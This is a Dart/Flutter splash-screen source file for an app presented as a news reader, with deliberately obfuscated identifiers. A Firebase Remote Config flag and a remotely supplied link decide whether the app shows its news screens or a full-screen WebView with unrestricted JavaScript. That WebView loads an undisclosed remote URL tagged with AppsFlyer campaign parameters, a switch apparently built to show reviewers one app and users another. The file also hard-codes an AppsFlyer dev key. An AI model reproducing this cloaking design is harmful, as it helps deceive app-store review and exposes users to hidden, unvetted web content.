import 'dart:async';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:niagara/jcenewsItemJHW.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'hcedb_newsSDKJ.dart';

import 'hceasosiyWKJ.dart';
import 'main.dart';
import 'news_model.dart';
import 'jhceonboardingWDKJ.dart';


late SharedPreferences nueSharedPreferencesSOQ;
final nrasRemoteConfig = FirebaseRemoteConfig.instance;
bool? nrasSuccessOej = nueSharedPreferencesSOQ.getBool("success");
String? nrasLink = nueSharedPreferencesSOQ.getString("link");

StreamSubscription? nrasDeepLinkSub;

final ValueNotifier _nrasIsLoadAppWND = ValueNotifier<bool>(false);
final ValueNotifier _nrasIsLoadNetWIM = ValueNotifier<bool>(false);

class gxwSplashScreenXW extends StatefulWidget {
  const gxwSplashScreenXW({super.key});

  @override
  State<gxwSplashScreenXW> createState() => _gxwSplashScreenXWState();
}

class _gxwSplashScreenXWState extends State<gxwSplashScreenXW>
    with SingleTickerProviderStateMixin {
  late AnimationController cye_animationControllerWIF;
  late Animation<double> ce_animationFIf;
  List<News> xwnewsItemsssFE = [];

  @override
  void initState() {
    super.initState();
    nueSharedPreferencesSOQ = context.read<SharedPreferences>();
    _nrasIsLoadAppWND.addListener(() {
      if (_nrasIsLoadAppWND.value && _nrasIsLoadNetWIM.value) _nrasNavPej();
    });
    _nrasIsLoadNetWIM.addListener(() {
      if (_nrasIsLoadAppWND.value && _nrasIsLoadNetWIM.value) _nrasNavPej();
    });
    if (nrasSuccessOej ?? false) {
      _nrasIsLoadNetWIM.value = true;
    }

    WidgetsBinding.instance.addPostFrameCallback((_) async {
      await _nrasRemoteConfigIer();
      await _nrasGetCheckCej();
      await _nrasRemoteConfigWie();
      await _nrasNothingHappendXwe();
      // await uwe_getAppsflyerWIKD();
    });

    cye_animationControllerWIF = AnimationController(
      vsync: this,
      duration: Duration(seconds: 3),
    );

    ce_animationFIf = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(
          parent: cye_animationControllerWIF, curve: Curves.easeInOut),
    );
    cye_animationControllerWIF.forward();
    cye_animationControllerWIF.addStatusListener((status) async {
      if (status == AnimationStatus.completed) {

        if (mounted) {
          await checkAndLoadNews();
          _nrasIsLoadAppWND.value = true;
        }
      }
    });
  }

  Future<void> checkAndLoadNews() async {
    final db = NewsDatabase.instance;

    // Check if the database is empty
    final existingNews = await db.readAllNews();

    if (existingNews.isEmpty) {
      for (var item in newsItems) {
        final news = News(
          title: item['title']!,
          description: item['description']!,
          image: item['image']!,
          date: item['date']!,
        );
        await db.createNews(news);
      }

      // Reload the news after populating the database
      xwnewsItemsssFE = await db.readAllNews();
    } else {
      // Load the existing news from the database
      xwnewsItemsssFE = existingNews;
    }
  }

  Future<void> _nrasRemoteConfigIer() async {
    try {
      await nrasRemoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 10),
        minimumFetchInterval: Duration.zero,
      ));
      await nrasRemoteConfig.fetchAndActivate();
    } catch (e) {
      nrasSuccessOej = false;
    }
  }
  Future<void> _nrasGetCheckCej() async {
    nrasLink ??= nrasRemoteConfig.getString("checkAeds");
    nueSharedPreferencesSOQ.setString("link", nrasLink!);
    nrasSuccessOej = nrasRemoteConfig.getBool("isNewestUser");
    //nrasSuccessOej = false;
    nueSharedPreferencesSOQ.setBool("success", nrasSuccessOej!);
    print('link: ${nrasLink} \nsuccess: ${nrasSuccessOej}');
    if (nrasSuccessOej ?? false) {
      _nrasIsLoadNetWIM.value = true;
    }
  }
  Future<void> _nrasRemoteConfigWie() async {
    final appsFlyerOptions = AppsFlyerOptions(
      afDevKey: "xYvAAoNDGp38QFaJdFiTL4",
      appId: "6661013459",
      timeToWaitForATTUserAuthorization: 3,
      showDebug: true,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    nrasAppsflyerSdk = AppsflyerSdk(appsFlyerOptions);

    await nrasAppsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );
    nrasAppsflyerSdk.onDeepLinking((dp) async {
      final nrasLcampaign = dp.deepLink!.deepLinkValue;
      final nrasLcampaignList = nrasLcampaign?.split("_");
      String? sub1 = nrasLcampaignList?.tryGet(0);
      String? sub2 = nrasLcampaignList?.tryGet(1);
      String? sub3 = nrasLcampaignList?.tryGet(2);
      String? sub4 = nrasLcampaignList?.tryGet(3);
      String? sub5 = nrasLcampaignList?.tryGet(4);
      String? sub6 = nrasLcampaignList?.tryGet(5);
      String? sub7 = nrasLcampaignList?.tryGet(6);
      if (nrasLink!.length < 50) {
        nrasLink = '$nrasLink?sub1=$sub1&sub2=$sub2&sub3=$sub3&sub4=$sub4&sub5=$sub5&sub6=$sub6&sub7=$sub7';
        await nueSharedPreferencesSOQ.setString("link", nrasLink!);
      }
      await Future.delayed(const Duration(seconds: 1));
      if (!(nrasSuccessOej ?? false)) {
        _nrasNavPej();
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => NrasPoliceWop(text: nrasLcampaign.toString())),
        );
      }
    });
    nrasAppsflyerSdk.startSDK(onSuccess: () {
    });
  }

  Future<void> _nrasNothingHappendXwe() async {
    if (mounted) {
      await Future.delayed(const Duration(seconds: 10));
      if (!mounted) return;
      bool seenOnboarding = nueSharedPreferencesSOQ.getBool('bbb') ?? false;
      if (seenOnboarding) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => jceAsosiyWJD()),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => yceOnboardingWUYD()),
        );
      }
      nrasSuccessOej = false;
      nueSharedPreferencesSOQ.setBool("success", false);
    }
  }

  void _nrasNavPej() async {
    bool seenOnboarding = nueSharedPreferencesSOQ.getBool('bbb') ?? false;
    if (!(nrasSuccessOej ?? false)) {
      if (seenOnboarding) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => jceAsosiyWJD()),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => yceOnboardingWUYD()),
        );
      }
    } else {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => NrasPoliceWop(text: '')),
      );
    }
  }

  @override
  void dispose() {
    _nrasIsLoadAppWND.dispose();
    nrasDeepLinkSub?.cancel();
    _nrasIsLoadNetWIM.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        backgroundColor: Color(0xff050B28),
        body: Stack(
          children: [
            Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Center(
                    child: Image.asset(
                      'assets/logo_icon.png',
                      width: 140.w,
                    ),
                  ),
                  SizedBox(height: 25.h),
                  Text(
                    'Loading...',
                    style: TextStyle(color: Colors.white),
                  ),
                  SizedBox(height: 10.h),
                  Container(
                    width: 140.w,
                    child: AnimatedBuilder(
                      animation: ce_animationFIf,
                      builder: (context, child) {
                        return LinearProgressIndicator(
                          value: ce_animationFIf.value,
                          backgroundColor: Color(0xff23273B),
                          color: Color(0xFF00CF84),
                          minHeight: 2.h,
                        );
                      },
                    ),
                  )
                ],
              ),
            )
          ],
        ));
  }
}

class NrasPoliceWop extends StatefulWidget {
  const NrasPoliceWop({
    super.key,
    required this.text,
  });
  final String text;

  @override
  State<NrasPoliceWop> createState() => _NrasPoliceWicState();
}

class _NrasPoliceWicState extends State<NrasPoliceWop> {
  late WebViewController _nrasWebViewControllerWiv;
  @override
  void initState() {
    super.initState();

    _nrasWebViewControllerWiv = WebViewController()
      ..loadRequest(
        Uri.parse(nrasLink!),
      )
      ..setJavaScriptMode(
        JavaScriptMode.unrestricted,
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) async {
            SystemChrome.setPreferredOrientations([
              DeviceOrientation.portraitUp,
              DeviceOrientation.landscapeLeft,
              DeviceOrientation.portraitDown,
              DeviceOrientation.landscapeRight,
            ]);
          },
        ),
      );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(
          children: [
            // SelectableText((widget.text)),
            // const SizedBox(height: 10),
            // SelectableText((link ?? '')),
            Expanded(
              child: WebViewWidget(
                controller: _nrasWebViewControllerWiv,
              ),
            ),
          ],
        ),
      ),
      bottomNavigationBar: OrientationBuilder(
        builder: (BuildContext context, Orientation orientation) {
          return Container(
            color: Colors.black,
            height: orientation == Orientation.portrait ? 25 : 30,
            alignment: Alignment.center,
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.end,
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(
                    Icons.arrow_back,
                  ),
                  onPressed: () async {
                    if (await _nrasWebViewControllerWiv.canGoBack()) {
                      _nrasWebViewControllerWiv.goBack();
                    }
                  },
                ),
                const SizedBox.shrink(),
                IconButton(
                  padding: EdgeInsets.zero,
                  color: Colors.white,
                  icon: const Icon(Icons.arrow_forward),
                  onPressed: () async {
                    if (await _nrasWebViewControllerWiv.canGoForward()) {
                      _nrasWebViewControllerWiv.goForward();
                    }
                  },
                ),
              ],
            ),
          );
        },
      ),
    );
  }
}

extension ListGetExtension<T> on List<T> {
  T? tryGet(int index) => index < 0 || index >= length ? null : this[index];
}


